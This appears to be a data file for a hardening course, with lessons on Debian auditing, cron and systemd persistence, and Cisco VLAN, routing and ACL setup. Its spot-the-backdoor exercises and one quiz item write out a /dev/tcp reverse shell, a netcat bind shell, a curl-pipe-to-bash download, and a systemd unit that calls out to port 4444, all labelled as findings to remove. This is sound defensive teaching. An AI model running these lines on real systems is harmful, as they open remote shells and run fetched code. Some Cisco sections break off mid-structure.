 {id:'j3',title:'Debian and deeper Linux',bloom:'Analyze',sum:'What differs from Mint and Ubuntu, plus auditing, logging, cron, kernel parameters, and finding persistence.',
  blocks:[
   C('Debian differences and deeper hardening','Analyze',
     TIPS('Debian (12 "bookworm", 13 "trixie") is close to Ubuntu but leaner. New installs ship without rsyslog; logs live in the systemd journal, so use <code>journalctl</code> rather than /var/log/auth.log. Some setups use a custom admin group; confirm with <code>sudo -l</code> and <code>/etc/sudoers</code>.',
          'The default install ships without a firewall front end: ufw may be absent. Check with <code>which ufw</code>; nftables is the native packet filter.',
          'Services you may meet: Apache or nginx, MySQL/MariaDB, Samba, Postfix, vsftpd, and Bind9. Harden the ones the brief keeps.',
          '<b>The hosts file answers first.</b> /etc/hosts on Linux and C:\\Windows\\System32\\drivers\\etc\\hosts on Windows answer name lookups before DNS, so a planted line can send update servers to 127.0.0.1 and quietly stop patching. Anything beyond the localhost lines needs a reason.',
          '<b>Main file and drop-ins.</b> sshd_config.d, sudoers.d, sysctl.d, cron.d, and sources.list.d each add settings beside a main file, so read the directory too. For most settings sshd keeps the first value it reads, and on Debian and Ubuntu its Include line sits at the top of sshd_config, so a drop-in beats the main file.',
          '<b>A repository is a trust decision.</b> apt installs whatever its sources and signing keys offer, so an unknown PPA, a planted file in /etc/apt/sources.list.d, a stray key in /etc/apt/keyrings, or [trusted=yes] lets someone else ship your updates.',
          'Think first in the six areas (accounts, access, configuration, patching, malware and persistence, and logging) and in commands second.'),
     CMDS('Audit and investigate',[
       ['sudo journalctl -p err -b','Errors since boot. Add --since "1 hour ago" to narrow.'],
       ['sudo journalctl -u ssh --since today','Logs for one service.'],
       ['systemctl list-unit-files --state=enabled','What starts at boot. Keep enabled only what the brief needs.'],
       ['crontab -l; sudo crontab -l','User and root cron jobs. Also check /etc/cron.* and /etc/crontab for rogue entries.'],
       ['ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly','Cron drop-in directories: a classic persistence spot.'],
       ['sudo grep -R "" /etc/systemd/system/*.service 2>/dev/null | grep -i exec','Look at ExecStart lines for odd commands in custom units.'],
       ['sudo ss -tulnp','Listening sockets with process. Match to the services you expect.'],
       ['sudo lsof -i -nP 2>/dev/null','Every network connection by process, confirming what ss shows.'],
       ['sudo find / -newermt "2026-01-01" -type f 2>/dev/null | grep -vE "^/proc|^/sys"','Files changed after a date: scoping recent tampering.']
     ])),
    ANATOMY('One crontab line: five time fields, then the command',[
     {name:'A crontab line',tag:'crontab -l',tone:'l3',children:[
       {name:'Schedule',tag:'five time fields',tone:'l2',grid:true,children:[
         {name:'Minute',tag:'0–59',tone:'l1',text:'<code>30</code> at minute 30'},
         {name:'Hour',tag:'0–23',tone:'l1',text:'<code>3</code> in the 03:00 hour'},
         {name:'Day of month',tag:'1–31',tone:'l1',text:'<code>*</code> any day'},
         {name:'Month',tag:'1–12',tone:'l1',text:'<code>*</code> every month'},
         {name:'Day of week',tag:'0–7',tone:'l1',text:'<code>1</code> Monday (0 and 7 are Sunday)'}]},
       {core:true,name:'Command',sub:'<code>/usr/local/bin/backup.sh</code>, run through /bin/sh as the crontab’s owner'}]}
   ],{intro:'Read the time fields left to right: minute, hour, day of month, month, and day of week. A <code>*</code> means every value, <code>*/5</code> means every fifth one, and <code>@reboot</code> replaces all five fields with “once, when cron starts at boot”.',
     label:'A crontab line has five time fields (minute, hour, day of month, month, and day of week) followed by the command it runs. This one runs a backup script at 03:30 every Monday.',
     strip:['This line','30 3 * * 1 backup.sh','30 3 * * 1 /usr/local/bin/backup.sh runs the backup script at 03:30 every Monday.'],
     facts:{head:['Where','What to know'],rows:[
       ['Per-user crontabs','<code>crontab -l</code> and <code>sudo crontab -l</code> list them; Debian and Ubuntu keep one file per user in <code>/var/spool/cron/crontabs</code>. Five fields, then the command, run as that user.'],
       ['System crontab','<code>/etc/crontab</code>: a sixth field names the user, before the command.'],
       ['Drop-in files','<code>/etc/cron.d/</code>: the same format as /etc/crontab, user field included.'],
       ['Period folders','<code>/etc/cron.hourly</code>, <code>cron.daily</code>, <code>cron.weekly</code>, and <code>cron.monthly</code> hold plain scripts; run-parts runs each one on that period.'],
       ['systemd timers','<code>systemctl list-timers</code>: a second scheduler to check alongside cron.']]},
     note:'<b>Persistence lives in every one of these places.</b> <code>@reboot</code> lines and short intervals such as <code>* * * * *</code> deserve a close look, especially when the command reaches out to the network.',
     caption:'Five time fields, then the command. System files under /etc add a user field before the command.'}),
   HIER('Where persistence hides on Linux',
     {name:'Anything that runs again',note:'Check each place, then hunt for what planted it',tone:'bad',children:[
       {name:'Schedulers',note:'cron (crontab -l and /etc/cron.*), systemd timers (systemctl list-timers --all), and at jobs (atq)',tone:'l2'},
       {name:'Boot',note:'systemd units (systemctl list-unit-files --state=enabled), /etc/rc.local, and /etc/init.d',tone:'l3'},
       {name:'Sign-in',note:'/etc/profile, /etc/profile.d, /etc/bash.bashrc, each user’s .bashrc and .profile, and ~/.ssh/authorized_keys',tone:'l4'}]},
     {intro:'A backdoor that survives a reboot has a starter. These are the three families of starters on Linux, each with its check.',
      caption:'Schedulers, boot, and sign-in: remove the starter first, then the program it runs.',
      key:[['l2','Runs on a schedule'],['l3','Runs at boot'],['l4','Runs at sign-in']]}),
   C('Kernel and logging baseline','Apply',
     CMDS('sysctl, auditd, and the journal',[
       ['sudo sysctl -w net.ipv4.ip_forward=0','A host that only serves leaves routing to routers (Freshman): forwarding off keeps it from becoming an attacker’s pivot. Persist it in /etc/sysctl.d/.'],
       ['sudo sysctl -w net.ipv4.conf.all.rp_filter=1','Reverse-path filtering (anti-spoofing). Persist in a file under /etc/sysctl.d/.'],
       ['sudo sysctl -w net.ipv4.icmp_echo_ignore_broadcasts=1','Ignore broadcast pings (smurf protection).'],
       ['sudo sysctl -w kernel.randomize_va_space=2','Full ASLR, a memory-corruption mitigation.'],
       ['sudo apt install auditd && sudo systemctl enable --now auditd','Kernel audit logging of security events.'],
       ['sudo auditctl -w /etc/passwd -p wa -k identity','An audit watch rule: log writes (w) and attribute changes (a) to /etc/passwd under the key identity. Persist rules in /etc/audit/rules.d/.'],
       ['sudo ausearch -k identity','Answers “who changed /etc/passwd, and when”.'],
       ['sudo aa-status','AppArmor: which profiles run in enforce or complain mode. A stopped AppArmor is a finding.'],
       ['journalctl --list-boots','More than one boot listed means the journal survives reboots. If only one appears, set Storage=persistent in /etc/systemd/journald.conf and restart systemd-journald.']
     ]),
     TIPS('<b>File permissions ask who you are; AppArmor asks what this program may touch.</b> AppArmor, the mandatory access control on Ubuntu, Mint, and Debian, confines a profiled service even when it runs as root.'),
     DETAIL('Kernel keys, audit rules, SUID lists, and hidden root',
       TIPS('<b>/etc/sysctl.d/99-hardening.conf:</b> net.ipv4.ip_forward = 0; accept_redirects 0 and send_redirects 0 (all and default); accept_source_route 0; rp_filter 1; log_martians 1; tcp_syncookies 1; icmp_echo_ignore_broadcasts 1; icmp_ignore_bogus_error_responses 1; IPv6 accept_redirects 0 and accept_source_route 0; kernel.randomize_va_space 2, kptr_restrict 2, dmesg_restrict 1, and sysrq 0; fs.protected_hardlinks 1, protected_symlinks 1, and suid_dumpable 0. Load every file with <code>sudo sysctl --system</code>; <code>sysctl -p</code> reads /etc/sysctl.conf alone.',
            '<b>auditd rules</b> (/etc/audit/rules.d/hardening.rules): -w /etc/passwd -p wa -k identity, -w /etc/shadow -p wa -k identity, -w /etc/sudoers -p wa -k sudoers, and -w /etc/sudoers.d/ -p wa -k sudoers. Load them with <code>augenrules --load</code>, list them with <code>auditctl -l</code>, and search with <code>ausearch -k identity</code>.',
            '<b>Stock SUID on Ubuntu and Mint includes</b> passwd, su, sudo, mount, umount, chsh, chfn, gpasswd, newgrp, pkexec, fusermount3, ssh-keysign, dbus-daemon-launch-helper, and polkit-agent-helper-1. <b>Stock SGID includes</b> chage, expiry, unix_chkpwd, and crontab. Compare a suspect with GTFOBins.',
            '<b>at jobs:</b> <code>atq</code> lists them and <code>atrm</code> removes one.',
            '<b>Hidden root:</b> userdel refuses a second UID 0 account, because root’s own processes share UID 0. Record it for the investigation, then use <code>userdel -f NAME</code>, or change its UID with vipw first.',
            '<b>Core dumps:</b> * hard core 0 in /etc/security/limits.conf. <b>The Ctrl+Alt+Del reboot:</b> <code>systemctl mask ctrl-alt-del.target</code>.'))),
    COMPARE('Now or for good: runtime and persistent changes',[
     {name:'Runtime',tag:'now, until reboot',tone:'amber',
      svg:{label:'A runtime change takes effect at once and is gone after a reboot.',
       body:'<path d="M8 38 H192" fill="none" stroke="var(--ink-3)" stroke-width="1.5"/><path d="M30 38 H108" fill="none" stroke="var(--amber)" stroke-width="5"/><circle cx="30" cy="38" r="6" fill="var(--amber)"/><text x="30" y="22" text-anchor="middle" font-size="11" fill="var(--ink)">set</text><path d="M114 12 V60" fill="none" stroke="var(--ink-2)" stroke-width="1.5" stroke-dasharray="3 3"/><text x="114" y="72" text-anchor="middle" font-size="10" fill="var(--ink-2)">reboot</text><text x="158" y="22" text-anchor="middle" font-size="11" fill="var(--ink)">gone</text><path d="M150 31 L166 47 M166 31 L150 47" fill="none" stroke="var(--bad)" stroke-width="2.5"/>'},
      rows:[['Kernel setting','<code>sysctl -w name=value</code>'],
            ['Service','<code>systemctl start</code> or <code>stop</code> changes it now'],
            ['Journal','<code>/run/log/journal</code>: kept in memory, cleared at reboot'],
            ['Cisco IOS','running-config, in RAM'],
            ['Check it','<code>sysctl name</code>; <code>systemctl is-active ssh</code>']],
      hook:'writing on a whiteboard that is wiped every night.'},
     {name:'Persistent',tag:'survives a reboot',tone:'ok',
      svg:{label:'A persistent change is still in effect after a reboot.',
       body:'<path d="M8 38 H192" fill="none" stroke="var(--ink-3)" stroke-width="1.5"/><path d="M30 38 H190" fill="none" stroke="var(--ok)" stroke-width="5"/><circle cx="30" cy="38" r="6" fill="var(--ok)"/><text x="30" y="22" text-anchor="middle" font-size="11" fill="var(--ink)">set</text><path d="M114 12 V60" fill="none" stroke="var(--ink-2)" stroke-width="1.5" stroke-dasharray="3 3"/><text x="114" y="72" text-anchor="middle" font-size="10" fill="var(--ink-2)">reboot</text><text x="158" y="22" text-anchor="middle" font-size="11" fill="var(--ink)">still set</text>'},
      rows:[['Kernel setting','A line in <code>/etc/sysctl.d/99-hardening.conf</code>; <code>sysctl --system</code> loads it now too'],
            ['Service','<code>systemctl enable</code> or <code>disable</code> sets what starts at boot'],
            ['Journal','<code>/var/log/journal</code>, with <code>Storage=persistent</code> in journald.conf'],
            ['Cisco IOS','startup-config, in NVRAM: <code>copy running-config</code> <code>startup-config</code>'],
            ['Check it','The file itself; <code>systemctl is-enabled ssh</code>; <code>journalctl --list-boots</code>']],
      hook:'writing it in the binder.'}
   ],{intro:'The same idea runs through four tools: one command changes the running system, and another records the change so it returns after a reboot. A hardening fix needs both.',
     note:'<b>Do both at once:</b> <code>systemctl enable --now</code> starts a service and sets it to start at boot; <code>disable --now</code> stops it and keeps it off at boot; <code>mask</code> blocks it from starting at all.',
     caption:'Runtime changes act now and vanish at reboot; persistent changes are read again at every boot. Make the change, then save it.',
     bloom:'Apply'}),
   C('Fix permissions on the files that matter','Apply',
     CMDS('chmod and chown',[
       ['sudo chown root:shadow /etc/shadow && sudo chmod 640 /etc/shadow','Expect -rw-r----- root shadow.'],
       ['sudo chown root:root /etc/passwd && sudo chmod 644 /etc/passwd','Expect -rw-r--r-- root root.'],
       ['sudo chmod 440 /etc/sudoers','Expect -r--r----- root root; edit it only with visudo.'],
       ['sudo chmod g-w,o-w FILE','Symbolic form: takes write from group and other, and keeps the owner’s bits.'],
       ['sudo find / -xdev -type d -perm -0002 ! -perm -1000 2>/dev/null','World-writable directories that lack the sticky bit.'],
       ['sudo find / -xdev -type f -perm -2000 2>/dev/null','SGID files. Compare them with a clean VM, as with SUID in Sophomore.']
     ]),
     TIPS('<b>SGID</b> (2000, an s in the group’s x spot) runs a program with its group’s rights; on a directory, new files take the directory’s group. The <b>sticky bit</b> (1000, a t in the other x spot) on a world-writable directory such as /tmp lets only a file’s owner delete or rename it.')),
   SPOT('j3sp','Spot the persistence: crontab -l','Tap every line that looks like a backdoor or seems out of place, then Check.',[
     ['# m h  dom mon dow   command',null],
     ['0 3 * * * /usr/bin/apt-get update',null],
     ['*/5 * * * * /bin/bash -c \'bash -i >& /dev/tcp/203.0.113.9/4444 0>&1\'','A reverse shell every five minutes. Remove it and hunt for whatever installed it.'],
     ['0 2 * * 0 /usr/local/bin/backup.sh',null],
     ['@reboot nc -lvp 1337 -e /bin/bash','A netcat backdoor that re-opens on every reboot. Remove.'],
     ['30 1 * * * certbot renew --quiet',null],
     ['* * * * * curl -s http://malware.example/x.sh | bash','Downloads and runs a script every minute (malware.example is a reserved example name). Remove immediately.']
   ]),
   SPOT('j3sp2','Spot the problems: a unit, sysctl.d, and ls -l','A web server that only serves pages. In the unit file, tap the line that runs the backdoor; in sysctl.d and ls -l, tap every risky line. Then Check.',[
     ['# /etc/systemd/system/sys-health.service',null],
     ['[Service]',null],
     ['ExecStart=/opt/.libupd/agent --connect 203.0.113.9:4444','A hidden folder in /opt and a call out to port 4444: a backdoor. Restart=always below brings it back after a kill, so disable the unit first, then remove both.'],
     ['Restart=always',null],
     ['User=root',null],
     ['# /etc/sysctl.d/99-hardening.conf',null],
     ['net.ipv4.conf.all.rp_filter = 1',null],
     ['net.ipv4.ip_forward = 1','This server only serves, so forwarding turns it into a router an attacker can pivot through. Set 0.'],
     ['kernel.randomize_va_space = 0','ASLR off makes memory attacks easier. Set 2.'],
     ['$ ls -l /etc/shadow /etc/passwd',null],
     ['-rw-r--r-- 1 root shadow 1203 Oct  2 09:14 /etc/shadow','Everyone can read the password hashes. sudo chmod 640 /etc/shadow.'],
     ['-rw-r--r-- 1 root root   2817 Oct  2 09:14 /etc/passwd',null]
   ]),
   QUIZ('j3q','Check: deeper Linux',[
     ['On a fresh Debian install, /var/log/auth.log is missing. Where do you read authentication events?',['It is impossible','journalctl, the systemd journal','/etc/passwd','dmesg only'],1,'Since Debian 12, the default install leaves out rsyslog, so Debian logs to the journal. For SSH logins use journalctl -u ssh. (Filtering on the process name sshd misses them on Debian 13: since OpenSSH 9.8 they come from sshd-session.)'],
     ['A cron line runs bash -i >& /dev/tcp/.../4444. This is',['A backup','A reverse shell backdoor','A system update','A log rotation'],1,'That is an attacker call-home. Remove the line and investigate how it got there (check all cron dirs, systemd units, and .bashrc).'],
     ['Which sysctl helps against IP address spoofing?',['kernel.randomize_va_space','net.ipv4.conf.all.rp_filter','vm.swappiness','fs.file-max'],1,'rp_filter drops packets whose return route to the source uses a different interface.'],
     ['Best single command to see what is listening and which process owns it?',['ps aux','sudo ss -tulnp','top','df -h'],1,'ss -tulnp ties ports to processes, the question you ask on every machine.']
   ]),
   LINKS('Go further',['debian-handbook','debian-security','debian-wiki','cis','stig','explainshell','t4t-lr-linux'])
  ]},
 {id:'j4',title:'Cisco: VLANs, routing, and ACLs',bloom:'Apply',sum:'Segment a network with VLANs, route between them, and filter traffic with access lists.',
  blocks:[
   C('VLANs and trunks','Apply',
     CMDS('Segment SwA and SwB',[
       ['vlan 10','Create the VLAN. Then: name STUDENTS. Repeat with vlan 20 (name TEACHERS), vlan 30 (name PRINCIPALS), vlan 99 (name NATIVE), and vlan 999 (name PARKING) on both SwA and SwB.'],
       ['interface range f0/1 - 8','Several ports at once.'],
       ['switchport mode access','These are host ports; the trunk is configured separately.'],
       ['switchport access vlan 10','Put the ports in VLAN 10, Students. Ports f0/9 - 16 go in VLAN 20 and f0/17 - 20 in VLAN 30.'],
       ['spanning-tree portfast','Then: spanning-tree bpduguard enable. Both belong on edge ports, as in Sophomore.'],
       ['interface g0/1','The uplink: SwA G0/1 to RtrA G0/0 (SwB G0/1 to RtrB G0/0).'],
       ['switchport mode trunk','Carry multiple VLANs over one link.'],

     bloom:'Apply'}),
   C('Native VLAN 99 on both ends','Analyze',
     P('One VLAN per trunk crosses untagged: the native VLAN, VLAN 1 unless you change it. This network moves it to VLAN 99, a VLAN that carries no hosts, and sets it the same way on the switch and the router.'),
     TIPS('<b>Set it on both ends.</b> On SwA G0/1: <code>switchport trunk native vlan 99</code>. On RtrA: <code>interface g0/0.99</code>, then <code>encapsulation dot1Q 99 native</code>.',
          '<b>Use a host-free VLAN.</b> VLAN 99 stays free of access ports, an SVI, and an IP address, and it stays separate from VLAN 999, where unused ports park.',
          '<b>Add 99 to the allowed list:</b> <code>switchport trunk allowed vlan 10,20,30,99</code>.',
          '<b>A mismatch shows up in the log.</b> Between Cisco devices running CDP, two ends that disagree log <code>%CDP-4-NATIVE_VLAN_MISMATCH</code>, and on a switch-to-switch trunk untagged frames from one VLAN land in the other.',
          '<b>Why:</b> double tagging works when an attacker’s access VLAN equals the trunk’s native VLAN. The first switch strips the outer tag and the next one obeys the inner tag. A host-free native VLAN leaves nothing to hop from.')),
   C('Layer 2 attacks and the switch defense for each','Understand',
     TIPS('<b>Switch spoofing</b> (a host negotiates a trunk with DTP): set every port to access or trunk by hand, with <code>switchport nonegotiate</code> on trunks.',
          '<b>Double tagging</b> (a second tag hops through the native VLAN): a host-free native VLAN, as in the card above.',
          '<b>Rogue DHCP server</b> (a fake gateway and DNS server for every client): DHCP snooping, with only the uplinks trusted.',
          '<b>ARP poisoning</b> (a host claims the gateway’s MAC address): dynamic ARP inspection, checked against the DHCP snooping table.',
          '<b>Root bridge takeover</b> (a rogue switch with a lower bridge priority claims root): BPDU guard on edge ports.',
          '<b>Unknown device on a wall jack:</b> port security, which limits the MAC addresses a port accepts.',
          '<b>Broadcast storm:</b> storm control, a per-port broadcast limit.'),
     P('Lockdown Drills: Cisco IOS walks through the commands for each defense.')),
   C('Inter-VLAN routing and ACLs','Apply',

       ['interface g0/0','The physical link to SwA G0/1. Then: no shutdown. It takes no IP address; the subinterfaces do.'],
       ['interface g0/0.10','Router subinterface for VLAN 10 (router-on-a-stick).'],
       ['encapsulation dot1Q 10','Binds this subinterface to frames tagged 10.'],
       ['ip address 10.1.10.1 255.255.255.0','The gateway for Students.'],
       ['interface g0/0.20','Then: encapsulation dot1Q 20 and ip address 10.1.20.1 255.255.255.0, the gateway for Teachers.'],
       ['interface g0/0.30','Then: encapsulation dot1Q 30 and ip address 10.1.30.1 255.255.255.0, the gateway for Principals.'],
       ['interface g0/0.99','Then: encapsulation dot1Q 99 native. It matches the switch’s native VLAN; it carries no hosts, so it needs no IP.'],
       ['interface g0/2','The inter-site link to RtrB G0/2. Then: ip address 10.0.0.1 255.255.255.252 and no shutdown.'],
       ['ip route 10.2.0.0 255.255.0.0 10.0.0.2','In global configuration: a static route that sends every Site B subnet (10.2.0.0/16) to RtrB at 10.0.0.2. RtrB needs the mirror route, ip route 10.1.0.0 255.255.0.0 10.0.0.1.'],
       ['access-list 10 permit 10.1.10.0 0.0.0.255','Standard ACL: match a source network with a wildcard mask (inverse of the subnet mask).'],

       ['permit ip any any','End with a permit when you mean to block only some traffic; the sequence below shows why.'],

   ],{intro:'One cable between the switch and the router carries the packet twice: up to the router in VLAN 10, and back down in VLAN 20.',
     note:'<b>The subinterface number is a label.</b> Matching .10 to VLAN 10 is a convention; <code>encapsulation dot1Q 10</code> is the command that binds the subinterface to the VLAN. The physical interface needs <code>no shutdown</code>, and the IP addresses go on the subinterfaces. A layer 3 switch does the same job internally with SVIs (<code>interface vlan 10</code>) and <code>ip routing</code>.',
     key:[['l1','VLAN 10 side'],['l3','VLAN 20 side'],['l4','The router: layer 3']],
     caption:'The router turns a VLAN 10 frame into a VLAN 20 frame; the trunk carries both directions.',

   C('Reading the routing table','Understand',
     TERM('RtrA# show ip route\nCodes: L - local, C - connected, S - static, O - OSPF ...\nGateway of last resort is not set\n\n      10.0.0.0/8 is variably subnetted, 9 subnets, 4 masks\nC        10.0.0.0/30 is directly connected, GigabitEthernet0/2\nL        10.0.0.1/32 is directly connected, GigabitEthernet0/2\nC        10.1.10.0/24 is directly connected, GigabitEthernet0/0.10\nL        10.1.10.1/32 is directly connected, GigabitEthernet0/0.10\nC        10.1.20.0/24 is directly connected, GigabitEthernet0/0.20\nL        10.1.20.1/32 is directly connected, GigabitEthernet0/0.20\nC        10.1.30.0/24 is directly connected, GigabitEthernet0/0.30\nL        10.1.30.1/32 is directly connected, GigabitEthernet0/0.30\nS        10.2.0.0/16 [1/0] via 10.0.0.2'),
     TIPS('<b>C</b> is a connected network and <b>L</b> the router’s own address on it, a /32; <b>S</b> is a static route. In <code>[1/0]</code>, the first number is the administrative distance and the second the metric.',
          '<b>The default route</b> catches every destination missing from the table. On a router with one way out, such as R1 in the IOS CLI Lab, <code>ip route 0.0.0.0 0.0.0.0 203.0.113.1</code> adds it; the table then shows <code>S* 0.0.0.0/0</code> and “Gateway of last resort is 203.0.113.1 to network 0.0.0.0”. A router without one drops traffic for unknown networks.',
          '<b>How a router picks:</b> the longest matching prefix wins first, so 10.2.20.0/24 beats 10.2.0.0/16, which beats 0.0.0.0/0. Among routes to the same prefix, the lower administrative distance wins (connected 0, static 1, and OSPF 110), then the lower metric.')),
   C('DHCP across VLANs','Understand',
     TIPS('A host finds a DHCP server by broadcast, and the router keeps broadcasts inside each VLAN, so each VLAN’s gateway either serves the pool itself (<code>ip dhcp pool</code>, with <code>ip dhcp excluded-address</code> for the gateway and switch addresses) or relays the request to a central server (<code>ip helper-address</code> on the gateway subinterface).',
          'A Windows host whose DHCP request goes unanswered falls back to 169.254.x.x (APIPA), the clue from <a href="#freshman/f4">Freshman</a>.'),
     DETAIL('DHCP on IOS',

            '<code>ip helper-address SERVER</code> on the client-facing gateway interface relays requests to a central server.',
            '<code>show ip dhcp binding</code> lists the leases; <code>ipconfig /renew</code> on a Windows client asks again.'))),

   ],{intro:'The type decides what an ACL can see. A standard ACL reads the source address alone, so blocking one service such as Telnet takes an extended ACL.',

   SEQ('How a router reads an ACL: top down, first match wins',[
     ['A packet meets the ACL','On <code>g0/0.10</code> with <code>ip access-group BLOCK_TELNET in</code>, before the routing decision.','l2'],
     {ask:'Line 10: <code>deny tcp any any eq 23</code>. A match?',tone:'l2',branches:[['Match','Deny: drop the packet and stop; later lines are skipped.'],['Otherwise','Go to the next line.']]},
     {ask:'Line 20: <code>permit ip any any</code>. A match?',tone:'l2',branches:[['Match','Permit: forward the packet and stop.'],['Otherwise','Go to the next line.']]},
     ['Implicit deny any','An unseen last line drops every packet that reaches it. It stays hidden in <code>show access-lists</code>, hit counter included.','bad']],
     {intro:'The router checks lines in order and acts on the first one that matches. Order beats specificity: a more specific line further down comes too late.',
      note:'<b>Direction:</b> <code>in</code> filters packets as they arrive on the interface, before routing; <code>out</code> filters packets as they leave, after routing. Each interface takes one ACL per direction for IPv4 and one for IPv6. Put specific lines first, and end with a permit for the traffic that should pass.',
      caption:'First match wins, and every ACL ends with an implicit deny. Read the hit counts with show access-lists to see which line matched.',
      bloom:'Apply'}),
   C('Teachers-only management with access-class','Apply',
     CMDS('One standard ACL, on every VTY line of all four devices',[
       ['access-list 20 remark Teachers at Site A and Site B','A remark documents the list in show running-config.'],
       ['access-list 20 permit 10.1.20.0 0.0.0.255','Site A Teachers.'],
       ['access-list 20 permit 10.2.20.0 0.0.0.255','Site B Teachers.'],
       ['line vty 0 15','On SwA and SwB. On RtrA and RtrB, enter every VTY range that show running-config lists (line vty 0 4, and line vty 5 15 where it appears).'],
       ['access-class 20 in','Only sources that ACL 20 permits open a session to this device.'],
       ['show access-lists 20','Verify the two permits and their match counts.'],
       ['ip access-list standard 20','Edit one entry: enter the numbered list in named mode, then remove one line by its sequence number from show access-lists, as in no 30.'],
       ['no access-list 20','Careful: this form deletes the whole list, and an access-class that points at a missing list permits every source, so the VTY lines open to everyone again.']
     ]),
     NOTE('<b>access-class and ip access-group filter different things.</b> <code>access-class</code>, under a line, filters who opens a session to the device itself, such as SSH to SwA. <code>ip access-group</code>, under an interface, filters traffic passing through that interface. In both, the implicit deny drops every source the list leaves out.'),
     NOTE('Larger networks give management its own dedicated VLAN; this network keeps it on Teachers so the Teachers-only ACL and the management subnet are one and the same.'),
     DETAIL('Editing ACLs',
       TIPS('<code>show access-lists</code> prints each entry with its sequence number (10, 20, 30, and so on).',
            '<code>ip access-list standard 20</code>, then <code>no 30</code>, removes one entry; <code>15 permit 10.1.20.0 0.0.0.255</code> inserts a line between 10 and 20.',
            '<code>access-list 20 remark TEXT</code> documents the list.',
            '<code>no access-list 20</code> deletes the whole list, and an access-class that points at a missing list permits every source.'))),
   SEQ('Prove it layer by layer',[
     ['<code>show vlan brief</code>','On SwA: STUDENTS, TEACHERS, PRINCIPALS, NATIVE, and PARKING, each with its ports.','l1'],
     ['<code>show interfaces trunk</code>','G0/1 trunking, native VLAN 99, and VLANs 10,20,30,99 allowed and forwarding.','l1'],
     ['<code>show interfaces g0/1 switchport</code>','Administrative Mode: trunk, and Trunking Native Mode VLAN: 99.','l1'],
     ['<code>show ip interface brief</code> on RtrA','G0/0 up/up without an address; G0/0.10, .20, and .30 up/up with their .1 addresses.','l3'],
     ['<code>show ip route</code> on RtrA','C routes for 10.1.10.0/24, 10.1.20.0/24, 10.1.30.0/24, and 10.0.0.0/30; an L route (the router’s own /32) for each interface address; and S 10.2.0.0/16 via 10.0.0.2.','l3'],
     ['Students PC: <code>ping 10.1.20.1</code>','RtrA answers for its Teachers address, so VLAN 10 crosses the trunk, g0/0.10 routes, and g0/0.20 is up. The next ping proves VLAN 20 crosses the trunk too.','l4'],
     ['Students PC: <code>ping 10.1.20.30</code>','A Teachers PC answers: inter-VLAN routing works end to end.','l4'],
     ['Site A PC: <code>ping 10.2.20.30</code>','A Site B PC answers: the inter-site link and the routes at both sites work.','l4'],
     {ask:'SSH to SwA at 10.1.20.2: who gets in?',branches:[['From a Teachers PC','A login prompt: ACL 20 permits 10.1.20.0/24.'],['From a Students PC','“% Connection refused by remote host”: access-class 20 turns it away.']]}
   ],{intro:'Verify from the bottom up: layer 2 on the switch, then layer 3 on the router, then end to end from the PCs. Each step clears the ground for the one after it.',
     key:[['l1','Layer 2: the switch'],['l3','Layer 3: the router'],['l4','End to end: the PCs']],
     caption:'When a step fails, stop and fix that layer; everything above it depends on it.',
     bloom:'Analyze'}),
   LAB('j4lab','Build Site A end to end, then Site B','Use Packet Tracer (2960 switches and 2911 routers), starting from the Sophomore SwA build. The IOS CLI Lab in Free play has one router and one switch, so it covers the Site A steps; build Site B and run the cross-site checks in Packet Tracer. Site A steps show their commands; Site B steps give only the goal, so you write those commands yourself. Semicolons separate the lines you type.',[
     ['SwA: confirm VLANs 10 STUDENTS, 20 TEACHERS, 30 PRINCIPALS, and 99 NATIVE.','show vlan brief'],
     ['SwA: make G0/1 a trunk with native VLAN 99 and the four allowed VLANs.','interface g0/1; switchport mode trunk; switchport trunk native vlan 99; switchport trunk allowed vlan 10,20,30,99; switchport nonegotiate'],
     ['RtrA: bring up g0/0 and build the three gateways.','interface g0/0; no shutdown; interface g0/0.10; encapsulation dot1Q 10; ip address 10.1.10.1 255.255.255.0; interface g0/0.20; encapsulation dot1Q 20; ip address 10.1.20.1 255.255.255.0; interface g0/0.30; encapsulation dot1Q 30; ip address 10.1.30.1 255.255.255.0'],
     ['RtrA: match the native VLAN.','interface g0/0.99; encapsulation dot1Q 99 native'],
     ['RtrA: address the inter-site link and add a route to Site B.','interface g0/2; ip address 10.0.0.1 255.255.255.252; no shutdown; exit; ip route 10.2.0.0 255.255.0.0 10.0.0.2'],
     ['SwA and RtrA: Teachers-only management on every VTY line (on RtrA, every range that show running-config lists).','access-list 20 permit 10.1.20.0 0.0.0.255; access-list 20 permit 10.2.20.0 0.0.0.255; line vty 0 15; access-class 20 in'],
     ['Site A check: a Students PC pings a Teachers PC.','ping 10.1.20.30'],
     ['Site B: build SwB the way Sophomore built SwA (hostname SwB, the five VLANs, edge ports with PortFast and BPDU guard, parked ports, SVI 10.2.20.2 with gateway 10.2.20.1, and SSH), then the trunk.',null],
     ['Site B: give RtrB the Sophomore router baseline, then repeat the router work with 10.2.x.0 subnets, 10.0.0.2 on G0/2, and a route back to 10.1.0.0/16.',null],
     ['Site B: put the same ACL 20 on every VTY line of SwB and RtrB.',null],
     ['Cross-site check: a Site A Teachers PC pings a Site B Teachers PC.','ping 10.2.20.30'],
     ['ACL check: SSH to SwA from a Teachers PC (a login prompt), then from a Students PC (connection refused).','ssh -l netadmin 10.1.20.2'],
     ['Optional: serve DHCP for VLAN 10 from RtrA, then run ipconfig /renew on a Students PC set to get its address automatically.','ip dhcp excluded-address 10.1.10.1 10.1.10.9; ip dhcp pool STUDENTS; network 10.1.10.0 255.255.255.0; default-router 10.1.10.1']
   ]),
   SPOT('j4sp','Read these outputs and flag each fault','Excerpts from SwA and RtrA at Site A. Tap every line that shows a fault, then Check. The prompt lines and the correct settings are safe.',[
     ['SwA# show interfaces f0/1 switchport',null],
     ['Name: Fa0/1',null],
     ['Administrative Mode: static access',null],
     ['Access Mode VLAN: 10 (STUDENTS)',null],
     ['SwA# show interfaces f0/5 switchport',null],
     ['Name: Fa0/5',null],
     ['Administrative Mode: static access',null],
     ['Access Mode VLAN: 1 (default)','Fa0/5 sits in the Students range (f0/1 - 8) yet lands in VLAN 1, the default. The PC there misses the Students gateway, and VLAN 1 carries user traffic. Fix: switchport access vlan 10.'],
     ['SwA# show interfaces g0/1 switchport',null],
     ['Name: Gi0/1',null],
     ['Administrative Mode: trunk',null],
     ['Operational Mode: trunk',null],
     ['Trunking Native Mode VLAN: 99 (NATIVE)',null],
     ['SwA# show interfaces trunk',null],
     ['Port        Mode    Encapsulation  Status     Native vlan',null],
     ['Gi0/1       on      802.1q         trunking   99',null],
     ['Port        Vlans allowed on trunk',null],
